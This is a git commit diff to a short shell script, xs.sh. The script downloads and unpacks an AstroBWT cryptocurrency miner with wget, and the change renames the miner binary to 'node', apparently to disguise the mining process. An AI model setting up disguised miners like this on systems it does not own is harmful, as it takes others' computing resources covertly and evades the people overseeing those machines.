c5436b3684814f0cccc99fd2b26e2fe6504eb31c
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-28 00:15:10 +0700

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,4 +1,5 @@
 mkdir astro
 wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz
 tar -xvf astrominer-V1.9.2.R5_amd64_linux.tar.gz
-ls
+mv astrominer astro
+mv astro/astrominer astro/node
